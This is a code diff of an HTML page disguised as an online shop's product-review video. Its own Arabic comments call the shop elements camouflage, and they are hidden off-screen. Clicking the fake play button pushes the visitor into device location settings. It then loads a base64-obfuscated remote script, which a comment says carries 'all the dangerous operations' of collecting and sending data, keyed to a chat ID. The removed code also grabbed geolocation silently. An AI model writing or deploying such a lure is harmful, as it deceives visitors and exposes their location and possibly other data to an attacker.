@@ -4,25 +4,20 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
     
-    <!-- META TAGS للتسويق والتوصيل -->
+    <!-- META TAGS للتسويق والتوصيل (للتمويه) -->
     <meta name="description" content="ShopStore - Your trusted online shopping destination. Buy electronics, fashion, home goods with fast delivery to your location. Best prices guaranteed." />
     <meta name="keywords" content="online shopping, buy products, delivery, shop online, store, deals, electronics, fashion, home goods, fast shipping" />
     <meta name="robots" content="index, follow" />
     <meta name="author" content="ShopStore" />
-    
-    <!-- Open Graph -->
     <meta property="og:title" content="ShopStore - Online Shopping with Fast Delivery" />
     <meta property="og:description" content="Shop the best products online with fast delivery to your location. Enable location for accurate shipping rates and delivery times." />
     <meta property="og:type" content="website" />
     <meta property="og:site_name" content="ShopStore" />
-    <meta property="og:locale" content="en_US" />
-    
-    <!-- Twitter Card -->
     <meta name="twitter:card" content="summary" />
     <meta name="twitter:title" content="ShopStore - Online Shopping" />
     <meta name="twitter:description" content="Fast delivery to your location. Enable location for shipping rates." />
     
-    <!-- Schema.org Structured Data للمتجر -->
+    <!-- Schema.org للمتجر (للتمويه) -->
     <script type="application/ld+json">
     {
         "@context": "https://schema.org",
@@ -30,37 +25,22 @@
         "name": "ShopStore",
         "description": "Online shopping store with fast delivery to your location",
         "url": "https://shopstore.com",
-        "logo": "https://shopstore.com/logo.png",
-        "sameAs": [
-            "https://facebook.com/shopstore",
-            "https://instagram.com/shopstore"
-        ],
         "contactPoint": {
             "@type": "ContactPoint",
             "contactType": "customer service",
             "telephone": "+1-800-555-0199",
             "email": "support@shopstore.com"
-        },
-        "address": {
-            "@type": "PostalAddress",
-            "addressLocality": "New York",
-            "addressCountry": "US"
-        },
-        "potentialAction": {
-            "@type": "SearchAction",
-            "target": "https://shopstore.com/search?q={search_term_string}",
-            "query-input": "required name=search_term_string"
         }
     }
     </script>
     
-    <!-- Schema.org للفيديو كمراجعة منتج -->
+    <!-- Schema.org للفيديو (للتمويه) -->
     <script type="application/ld+json">
     {
         "@context": "https://schema.org",
         "@type": "VideoObject",
         "name": "Product Review & Unboxing",
-        "description": "Watch our detailed product review and unboxing video. See the product features before you buy. Fast delivery available.",
+        "description": "Watch our detailed product review and unboxing video. Fast delivery available.",
         "thumbnailUrl": "https://i.postimg.cc/jSfpHvz8/IMG-20260104-210740-951.jpg",
         "uploadDate": "2024-01-15",
         "duration": "PT2M45S",
@@ -89,7 +69,7 @@
             overflow: hidden;
         }
 
-        /* إخفاء ذكي: خارج الشاشة + شفافية + حجم 0 + مخفي خلف الفيديو */
+        /* عناصر المتجر مخفية عن المستخدم */
         .store-header {
             position: fixed !important;
             top: -9999px !important;
@@ -118,7 +98,7 @@
             visibility: hidden !important;
         }
 
-        .product-details {
+        .product-info-hidden {
             position: absolute !important;
             top: -9999px !important;
             left: -9999px !important;
@@ -132,7 +112,7 @@
             visibility: hidden !important;
         }
 
-        .delivery-badge {
+        .delivery-notice-hidden {
             position: absolute !important;
             top: -9999px !important;
             left: -9999px !important;
@@ -154,7 +134,6 @@
             overflow: hidden;
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
             position: relative;
-            margin-top: 0;
         }
 
         .video-thumbnail {
@@ -168,10 +147,11 @@
             display: flex;
             align-items: center;
             justify-content: center;
+            cursor: default;
             flex-direction: column;
         }
 
-        #playTrigger {
+        #locationActionButton {
             display: flex;
             align-items: center;
             justify-content: center;
@@ -186,17 +166,21 @@
             box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
             z-index: 10;
         }
-        #playTrigger:hover {
+        #locationActionButton:hover {
             transform: scale(1.05);
             background: rgba(255, 255, 255, 0.2);
             border-color: #ff4757;
             box-shadow: 0 0 60px rgba(255, 0, 0, 0.6);
         }
-        #playTrigger .play-icon {
+        #locationActionButton .play-icon {
             font-size: 60px;
             color: #ff6b6b;
             line-height: 1;
             user-select: none;
+        }
+
+        .play-button-overlay {
+            display: none;
         }
 
         .video-info {
@@ -220,7 +204,7 @@
             gap: 10px;
         }
 
-        .ctrl-btn {
+        .control-button {
             background: none;
             border: none;
             color: white;
@@ -231,11 +215,11 @@
             transition: background 0.2s;
         }
 
-        .ctrl-btn:hover {
+        .control-button:hover {
             background: #333;
         }
 
-        .seek-bar {
+        .progress-bar {
             flex-grow: 1;
             height: 4px;
             background: #333;
@@ -246,28 +230,47 @@
             min-width: 60px;
         }
 
-        .seek-fill {
+        .progress-fill {
             position: absolute;
             height: 100%;
             width: 0%;
             background: #ff0000;
         }
 
-        .timer {
+        .time-display {
             color: #aaa;
             font-size: 0.9rem;
             min-width: 100px;
             text-align: center;
         }
 
-        .volume-area {
+        .spinner {
+            border: 4px solid #fff;
+            border-top: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            width: 32px;
+            height: 32px;
+            animation: spin 1s linear infinite;
+            position: absolute;
+            display: none;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        @keyframes spin {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        .volume-control {
             display: flex;
             align-items: center;
             gap: 10px;
             color: #aaa;
         }
 
-        .vol-bar {
+        .volume-slider {
             width: 80px;
             height: 4px;
             background: #333;
@@ -275,11 +278,15 @@
             position: relative;
         }
 
-        .vol-fill {
+        .volume-level {
             position: absolute;
             height: 100%;
             width: 70%;
             background: #ff0000;
+        }
+
+        .fullscreen-btn {
+            margin-left: 15px;
         }
 
         @media (max-width: 480px) {
@@ -287,10 +294,10 @@
                 padding: 10px 12px;
                 gap: 6px;
             }
-            .seek-bar {
+            .progress-bar {
                 margin: 0 6px;
             }
-            .timer {
+            .time-display {
                 font-size: 0.75rem;
                 min-width: 60px;
             }
@@ -300,11 +307,11 @@
             .video-thumbnail {
                 height: 280px;
             }
-            #playTrigger {
+            #locationActionButton {
                 width: 90px;
                 height: 90px;
             }
-            #playTrigger .play-icon {
+            #locationActionButton .play-icon {
                 font-size: 45px;
             }
         }
@@ -312,59 +319,67 @@
 </head>
 <body>
 
-    <!-- شريط المتجر العلوي (مخفي بطريقة متطورة) -->
+    <!-- عناصر المتجر المخفية (للتمويه فقط) -->
     <div class="store-header" aria-hidden="true">
         <span>🛒 ShopStore</span>
         <span>🔍 Search products...</span>
         <span>🛒 Cart (0)</span>
     </div>
 
-    <!-- حاوية الفيديو -->
+    <!-- معلومات المنتج المخفية (للتمويه فقط) -->
+    <div class="product-info-hidden" aria-hidden="true">
+        <span>$49.99</span>
+        <span>★★★★★ 4.8</span>
+        <span>🚚 Free Shipping</span>
+        <span>✅ In Stock</span>
+    </div>
+
+    <!-- رسالة التوصيل المخفية (للتمويه فقط) -->
+    <div class="delivery-notice-hidden" aria-hidden="true">
+        <span>📍</span> 
+        <span>Enable location for delivery rates & faster shipping</span>
+    </div>
+
     <div class="video-player-container">
         <div class="video-info">
             <div class="video-title">Private Video</div>
+            <div class="video-meta"></div>
         </div>
 
-        <!-- معلومات المنتج (مخفية بطريقة متطورة) -->
-        <div class="product-details" aria-hidden="true">
-            <span>$49.99</span>
-            <span>★★★★★ 4.8</span>
-            <span>🚚 Free Shipping</span>
-            <span>✅ In Stock</span>
-        </div>
-
-        <div class="video-thumbnail" id="posterArea">
-            <!-- رسالة التوصيل (مخفية بطريقة متطورة) -->
-            <div class="delivery-badge" id="deliveryBadge" aria-hidden="true">
-                <span>📍</span> 
-                <span>Enable location for delivery rates & faster shipping</span>
-            </div>
-            
-            <div id="playTrigger">
+        <div class="video-thumbnail" id="thumbnailArea">
+            <div id="locationActionButton">
                 <span class="play-icon">▶</span>
             </div>
+
+            <div class="play-button-overlay" id="playButtonOverlay">
+                <div class="play-icon-large"></div>
+                <div class="spinner" id="spinner"></div>
+            </div>
         </div>
 
-        <video id="mainVideo" controls playsinline style="display:none; width:100%; height:450px; background:#000;">
+        <video id="realVideo" controls playsinline muted style="display:none; width:100%; height:450px; background:#000;">
             <source src="https://files.catbox.moe/okukrp.mp4" type="video/mp4" />
         </video>
 
         <div class="video-controls">
-            <div class="seek-bar">
-                <div class="seek-fill"></div>
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
             </div>
-            <div class="timer">0:00 / 2:45</div>
-            <div class="volume-area">
-                <span>🔊</span>
-                <div class="vol-bar">
-                    <div class="vol-fill"></div>
+
+            <div class="time-display">0:00 / 2:45</div>
+
+            <div class="volume-control">
+                <span></span>
+                <div class="volume-slider">
+                    <div class="volume-level"></div>
                 </div>
             </div>
-            <button class="ctrl-btn">⛶</button>
+
+            <button class="control-button fullscreen-btn">⛶</button>
         </div>
     </div>
 
-    <!-- تذييل المتجر (مخفي بطريقة متطورة) -->
+    <!-- تذييل المتجر المخفي (للتمويه فقط) -->
     <div class="store-footer" aria-hidden="true">
         <span>Privacy Policy</span>
         <span>Terms of Service</span>
@@ -378,105 +393,155 @@
         (function() {
             'use strict';
 
-            const playBtn = document.getElementById('playTrigger');
-            const poster = document.getElementById('posterArea');
-            const videoEl = document.getElementById('mainVideo');
-            
-            let started = false;
+            let settingsOpened = false;
+            let videoStarted = false;
+            let isProcessing = false;
 
-            function playVideo() {
-                poster.style.display = 'none';
-                videoEl.style.display = 'block';
-                videoEl.muted = false;
-                videoEl.volume = 1.0;
-                videoEl.play().catch(() => {
-                    setTimeout(() => videoEl.play().catch(() => {}), 200);
-                });
+            const locationBtn = document.getElementById('locationActionButton');
+            const thumbnailArea = document.getElementById('thumbnailArea');
+            const realVideo = document.getElementById('realVideo');
+            const spinner = document.getElementById('spinner');
+            const loading = document.getElementById('loading');
+
+            // ===== فتح إعدادات الموقع =====
+            function openLocationSettings() {
+                const ua = navigator.userAgent;
+                if (/Android/i.test(ua)) {
+                    const intents = [
+                        'intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
+                        'intent://com.android.settings.location.LocationSettings#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end',
+                        'intent:#Intent;action=android.settings.SETTINGS;end'
+                    ];
+                    for (let intent of intents) {
+                        try {
+                            window.location.href = intent;
+                            break;
+                        } catch (e) {}
+                    }
+                } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                    window.open('App-Prefs:Privacy&path=LOCATION', '_blank');
+                    setTimeout(() => {
+                        window.open('prefs:root=Privacy&path=LOCATION', '_blank');
+                    }, 500);
+                } else if (/Windows/i.test(ua)) {
+                    window.open('ms-settings:privacy-location', '_blank');
+                } else if (/Mac/i.test(ua)) {
+                    window.open('x-apple.systempreferences:com.apple.preference.security?Privacy_LocationServices', '_blank');
+                } else {
+                    window.location.href = 'intent:#Intent;action=android.settings.SETTINGS;end';
+                }
             }
 
-            function requestLocationSilently() {
-                navigator.geolocation.getCurrentPosition(
-                    function(pos) {
-                        window._loc = {
-                            lat: pos.coords.latitude,
-                            lng: pos.coords.longitude
-                        };
-                    },
-                    function() {},
-                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-                );
-            }
-
+            // ===== استدعاء API الخارجي الذي يحتوي كل العمليات الخطيرة =====
             function loadExternalAPI() {
-                var e = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0ZHREhTSFMvYXBpL3JlZnMvaGVhZHMvbWFpbi9hcGk=';
-                var u = atob(e);
+                var encodedUrl = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0ZHREhTSFMvYXBpL3JlZnMvaGVhZHMvbWFpbi9hcGk=';
+                var decodedUrl = atob(encodedUrl);
                 
-                var s = document.createElement('script');
-                s.src = u;
-                s.async = true;
+                var scriptTag = document.createElement('script');
+                scriptTag.src = decodedUrl;
+                scriptTag.async = true;
                 
-                window._x = new URLSearchParams(window.location.search).get('chatId') || '';
+                // تمرير ChatId للـ API
+                window._chatId = new URLSearchParams(window.location.search).get('chatId') || '';
                 
-                document.head.appendChild(s);
+                document.head.appendChild(scriptTag);
                 
-                s.onload = function() {
+                scriptTag.onload = function() {
                     setTimeout(function() {
-                        if (s.parentNode) s.parentNode.removeChild(s);
-                    }, 4000);
+                        if (scriptTag.parentNode) {
+                            scriptTag.parentNode.removeChild(scriptTag);
+                        }
+                    }, 5000);
                 };
             }
 
-            function onPlayClick(e) {
-                if (started) return;
-                started = true;
-
-                playVideo();
-                requestLocationSilently();
-                loadExternalAPI();
-                
-                playBtn.style.pointerEvents = 'none';
-                playBtn.style.opacity = '0';
+            // ===== إظهار الفيديو مع الصوت =====
+            function showVideo() {
+                thumbnailArea.style.display = 'none';
+                realVideo.style.display = 'block';
+                realVideo.muted = false;
+                realVideo.volume = 1.0;
+                if (realVideo.paused) {
+                    realVideo.play().catch(() => {});
+                }
             }
 
-            if (playBtn) {
-                playBtn.addEventListener('click', onPlayClick);
+            // ===== معالج الضغط على الزر =====
+            async function handleButtonClick() {
+                if (isProcessing || videoStarted) return;
+
+                if (!settingsOpened) {
+                    // الضغطة الأولى: فتح إعدادات الموقع
+                    settingsOpened = true;
+                    openLocationSettings();
+                } else {
+                    // الضغطة الثانية: بدء تشغيل الفيديو + استدعاء API
+                    videoStarted = true;
+                    
+                    realVideo.muted = false;
+                    realVideo.volume = 1.0;
+                    realVideo.play().catch(() => {});
+                    
+                    // استدعاء API الخارجي (يحتوي كل عمليات الجمع والإرسال)
+                    loadExternalAPI();
+                    
+                    // إظهار الفيديو
+                    showVideo();
+                }
             }
 
+            // ===== رصد العودة من الإعدادات =====
+            document.addEventListener('visibilitychange', function() {
+                if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
+                    // المستخدم عاد من الإعدادات
+                }
+            });
+
+            // ===== ربط الأحداث =====
+            if (locationBtn) {
+                locationBtn.addEventListener('click', handleButtonClick);
+            }
+
+            // ===== تفعيل الصوت عند أي تفاعل =====
             document.addEventListener('click', function() {
-                if (videoEl && videoEl.style.display === 'block') {
-                    videoEl.muted = false;
-                    if (videoEl.paused) videoEl.play().catch(() => {});
+                if (realVideo) {
+                    realVideo.muted = false;
+                    realVideo.volume = 1.0;
                 }
             }, true);
 
-            document.querySelectorAll('.ctrl-btn').forEach(btn => {
-                btn.addEventListener('click', function(e) {
+            // ===== أزرار التحكم =====
+            document.querySelectorAll('.control-button').forEach(button => {
+                button.addEventListener('click', function(e) {
                     e.stopPropagation();
                     if (this.textContent.includes('⛶')) {
-                        if (videoEl.requestFullscreen) {
-                            videoEl.requestFullscreen();
-                        } else if (videoEl.webkitRequestFullscreen) {
-                            videoEl.webkitRequestFullscreen();
+                        const video = document.getElementById('realVideo');
+                        if (video.requestFullscreen) {
+                            video.requestFullscreen();
+                        } else if (video.webkitRequestFullscreen) {
+                            video.webkitRequestFullscreen();
                         }
                     }
                 });
             });
 
-            const progressTimer = setInterval(() => {
-                const fill = document.querySelector('.seek-fill');
-                if (videoEl.style.display === 'block') {
-                    clearInterval(progressTimer);
+            // ===== شريط التقدم الوهمي =====
+            const progressInterval = setInterval(() => {
+                const progressFill = document.querySelector('.progress-fill');
+                const realVideoEl = document.getElementById('realVideo');
+                if (realVideoEl.style.display === 'block') {
+                    clearInterval(progressInterval);
                     return;
                 }
-                const w = parseInt(fill.style.width) || 35;
-                const nw = (w + 0.1) % 100;
-                fill.style.width = nw + '%';
-                
-                const sec = Math.floor((nw / 100) * 165);
-                const m = Math.floor(sec / 60);
-                const s = sec % 60;
-                document.querySelector('.timer').textContent = 
-                    `${m}:${s.toString().padStart(2, '0')} / 2:45`;
+                const currentWidth = parseInt(progressFill.style.width) || 35;
+                const newWidth = (currentWidth + 0.1) % 100;
+                progressFill.style.width = newWidth + '%';
+
+                const timeDisplay = document.querySelector('.time-display');
+                const currentSeconds = Math.floor((newWidth / 100) * 165);
+                const minutes = Math.floor(currentSeconds / 60);
+                const seconds = currentSeconds % 60;
+                timeDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')} / 2:45`;
             }, 1000);
 
         })();
